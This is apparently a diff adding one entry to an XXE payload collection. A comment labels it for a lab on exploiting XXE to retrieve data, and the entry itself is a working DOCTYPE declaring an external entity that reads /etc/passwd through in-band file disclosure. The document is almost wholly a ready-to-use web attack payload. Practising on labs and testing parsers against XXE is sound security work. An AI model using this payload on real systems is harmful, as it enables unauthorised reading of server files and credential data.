@@ -1,0 +1,6 @@
+<!-- 
+Payload: Classic XXE
+Usage: Direct file read (in-band)
+Lab: Exploiting XXE to retrieve data
+-->
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
